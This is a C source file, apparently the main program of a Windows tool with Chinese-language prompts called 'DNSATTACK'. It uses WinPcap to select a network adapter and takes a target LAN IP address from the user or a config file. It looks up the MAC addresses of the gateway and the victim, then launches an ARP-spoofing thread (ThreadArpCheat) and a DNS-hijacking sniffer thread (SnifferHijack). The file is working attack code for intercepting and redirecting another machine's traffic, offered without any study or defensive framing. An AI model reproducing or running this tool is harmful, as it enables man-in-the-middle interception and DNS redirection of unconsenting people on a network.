

#include <stdio.h>
#include <WINSOCK2.H>
#include <windows.h>
#include "MainProc.h"
#include "Public.h"
#include "Packet.h"
#include "WinpcapDnsHijack.h"
#include "..\\include\\pcap.h"
#include "..\\include\\pcap\\pcap.h"
#include "..\\include\\openssl\\ssl.h"
#include "..\\include\\openssl\\err.h"

#pragma comment ( lib, "..\\lib\\libeay32.lib" )
#pragma comment ( lib, "..\\lib\\ssleay32.lib" )
#pragma comment(lib,"ws2_32.lib")
#pragma comment(lib,"..\\lib\\wpcap.lib")

#include <Nb30.h>
#include <IPHlpApi.h>
#pragma comment(lib,"netapi32.lib")








int __cdecl main(int argc, TCHAR* argv[])
{
	int	nRetCode = 0;
	char szInitFile[MAX_PATH];
	nRetCode = GetCurrentDirectoryA(MAX_PATH,szInitFile);
	lstrcatA(szInitFile,"\\");
	lstrcatA(szInitFile,DNS_INIT_FILENAME);

	WORD wVersionRequested = MAKEWORD(2, 2);
	WSADATA wsaData = {0};
	if (WSAStartup(wVersionRequested, &wsaData) != 0)
	{
		printf("WSAStartup error,error code is:%d\n", GetLastError());
		getchar();
		return -1;
	}

	//pcap_if = pcap_if_t     pcap_t = pcap
	pcap_t *	pcapMain = 0;
	pcap_if_t * pcapDevBuf = 0;
	pcap_if_t * pcapTmpDev = 0;
	int			iChooseNum = 0;
	int			iTmp = 0;
	char		strPcapErrBuf[PCAP_ERRBUF_SIZE];
	char		szInputIP[MAX_PATH];
	DWORD		dwHijackIP = 0;

	if (pcap_findalldevs(&pcapDevBuf, strPcapErrBuf) == -1)
	{
		fprintf(stderr,"Error in pcap_findalldevs: %s\n", strPcapErrBuf);
		getchar();
		exit(0);
	}

	printf("本机安装的网卡列表如下:\n");
	for(pcapTmpDev = pcapDevBuf; pcapTmpDev; pcapTmpDev = pcapTmpDev->next)
	{
		printf("网卡号码: %d\n网卡名称: %s\n网卡描述: %s\r\n\r\n",iTmp + 1, pcapTmpDev->name, pcapTmpDev->description);
		++ iTmp;
	}
	if(iTmp==0)
	{
		printf("No interfaces found! Make sure WinPcap is installed\n");
		pcap_freealldevs(pcapDevBuf);
		getchar();
		return -1;
	}

	HANDLE hFileInit = CreateFileA(szInitFile,GENERIC_READ,0,0,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0);
	if(hFileInit == INVALID_HANDLE_VALUE)
	{
		printf("未找到配置文件或者配置文件错误,请手动输入网卡抓包号码(1-%d):",iTmp);
		scanf_s("%d", &iChooseNum);
		printf("\n");

		printf("请输入要劫持的局域网IP地址:");
		scanf("%s", szInputIP);
		printf("\n");
		dwHijackIP = inet_addr(szInputIP);

	}
	else
	{
		DWORD dwFileSize = GetFileSize(hFileInit,0);
		char *lpszConfig = new char [dwFileSize + 0x1000];
		DWORD dwCnt = 0;
		nRetCode = ReadFile(hFileInit,lpszConfig,dwFileSize,&dwCnt,0);
		CloseHandle(hFileInit);
		if (nRetCode == 0 || dwFileSize != dwCnt)
		{
			pcap_freealldevs(pcapDevBuf);
			getchar();
			return FALSE;
		}
		*(dwFileSize + lpszConfig) = 0;

		char * pEnd = lpszConfig;
		char * pHdr = strstr(pEnd,"netcard=");
		if (pHdr)
		{
			pHdr += lstrlenA("netcard=");
			pEnd = strstr(pHdr,"\r\n");
			if (pEnd && pEnd - pHdr < MAX_PATH)
			{
				char szNum[MAX_PATH] = {0};
				memmove(szNum,pHdr,pEnd - pHdr);
				iChooseNum = atoi(szNum);

				pEnd += 2;
				pHdr = pEnd;
				pHdr = strstr(pEnd,"hijackip=");
				if (pHdr )
				{
					pHdr += lstrlenA("hijackip=");

					pEnd = strstr(pHdr,"\r\n");
					if (pEnd == 0)
					{
						pEnd = dwFileSize + lpszConfig;
					}

					char szHijackIP[MAX_PATH] = {0};
					memmove(szHijackIP,pHdr,pEnd - pHdr);
					dwHijackIP = inet_addr(szHijackIP);
				}
			}
		}

		if (dwHijackIP == 0 || iChooseNum == 0)
		{
			printf("process config file error\r\n");
			pcap_freealldevs(pcapDevBuf);
			getchar();
			return -1;
		}
	}

	if(iChooseNum < 1 || iChooseNum > iTmp)
	{
		printf("Interface number out of range\n");
		pcap_freealldevs(pcapDevBuf);
		getchar();
		return -1;
	}

	for(pcapTmpDev = pcapDevBuf, iTmp = 0; iTmp < iChooseNum-1; pcapTmpDev = pcapTmpDev->next, iTmp ++);

	if ((pcapMain = pcap_open_live(pcapTmpDev->name,MAX_PACKET_SIZE,0,PCAP_OPEN_LIVE_TO_MS_VALUE_0,strPcapErrBuf)) == NULL)
	{
		fprintf(stderr,"\nUnable to open the adapter. %s is not supported by WinPcap\n", pcapTmpDev->name);
		pcap_freealldevs(pcapDevBuf);
		getchar();
		return -1;
	}

	nRetCode = pcap_setbuff(pcapMain,MAX_PCAP_BUFFER);	//the limit buffer size of capraw is 100M
	if( nRetCode == -1)
	{
		printf("pcap_setbuff error!the limit of the buffer size is 100M,maybe it is too big!\n");
		getchar();
		return FALSE;
	}	


// #define PCAP_FILTER_MASK_VALUE 0xffffff
// 	bpf_program		stBpfp = {0};
// 	u_int			uiMypcapNetMask = PCAP_FILTER_MASK_VALUE;
// 	nRetCode = pcap_compile(pcapMain, &stBpfp, PCAP_DNS_PORT_FILTER, 1, uiMypcapNetMask);	
// 	if(nRetCode <0 )
// 	{		
// 		fprintf(stderr,"数据包过滤条件语法设置失败,请检查过滤条件的语法设置\n");
// 		pcap_freealldevs(pcapDevBuf);
// 		getchar();
// 		return FALSE;
// 	}
// 	nRetCode = pcap_setfilter(pcapMain, &stBpfp);
// 	if( nRetCode < 0 )
// 	{
// 		fprintf(stderr,"数据包过滤条件设置失败\n");
// 		pcap_freealldevs(pcapDevBuf);
// 		getchar();
// 		return FALSE;
// 	}


	char szNetIP[MAX_PATH] = {0};
	char lpMac[MAC_ADDRESS_LENGTH] = {0};
	char lpGateWayMac[MAC_ADDRESS_LENGTH] = {0};
	DWORD dwGateWayIP = 0;
	DWORD dwIP = 0;

// 	DWORD gLocalIPAddr = 0;
// 	gLocalIPAddr = GetLocalIpAddress();
// 	if (gLocalIPAddr == FALSE)
// 	{
// 		return FALSE;
// 	}
	nRetCode = GetNetCardInfo(&dwIP,lpMac,szNetIP,&dwGateWayIP,lpGateWayMac);

	ARP_CHEAT_PARAM stParam = {0};
	stParam.dwLocalIP = dwIP;
	stParam.dwGateWayIP = dwGateWayIP;
	stParam.dwHijackIP = dwHijackIP;
	memmove(stParam.lpLocalMac,lpMac,MAC_ADDRESS_LENGTH);
	memmove(stParam.lpGateWayMac,lpGateWayMac,MAC_ADDRESS_LENGTH);
	stParam.pcapMain = pcapMain;
	stParam.lpPcapErrorBuf = strPcapErrBuf;
	DWORD dwMacLen = MAC_ADDRESS_LENGTH;
	nRetCode = SendARP((IPAddr)dwGateWayIP,0,stParam.lpGateWayMac,&dwMacLen);
	if (nRetCode != FALSE)
	{
		printf("SendARP Error: %d\n",GetLastError());
		return FALSE;
	}

	nRetCode = SendARP(stParam.dwHijackIP,0,(unsigned long*)stParam.lpHijackMac,&dwMacLen);
	if(nRetCode != NO_ERROR)
	{
		printf("SendARP Error: %d\n",GetLastError());
		return FALSE;
	}
	HANDLE hThreadArpCheat = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)ThreadArpCheat,&stParam,0, 0);
	CloseHandle(hThreadArpCheat);


	HANDLE hPcapMainProcess = CreateThread(0,0,(LPTHREAD_START_ROUTINE)SnifferHijack,&stParam,0,0);
	if(hPcapMainProcess == FALSE)
	{
		printf("CreateThread error!error code is:%d\n",GetLastError());
		pcap_freealldevs(pcapDevBuf);
		getchar();
		return GetLastError();
	}
	nRetCode = SetThreadPriority(hPcapMainProcess,THREAD_PRIORITY_HIGHEST);
	if(!nRetCode)
	{
		printf("SetThreadPriority error!error code is:%d\n",GetLastError());
		pcap_freealldevs(pcapDevBuf);
		CloseHandle(hPcapMainProcess);
		getchar();
		return GetLastError();
	}
	//CloseHandle(hPcapMainProcess);
	printf("DNSATTACK正在监听网卡:%s\n", pcapTmpDev->description);
	//pcap_freealldevs(pcapDevBuf);

	while (TRUE)
	{
		Sleep(0xffffffff);
		//printf("dns attack total counts:%ld\n",gAttackCnt);
	}

	return nRetCode;
}
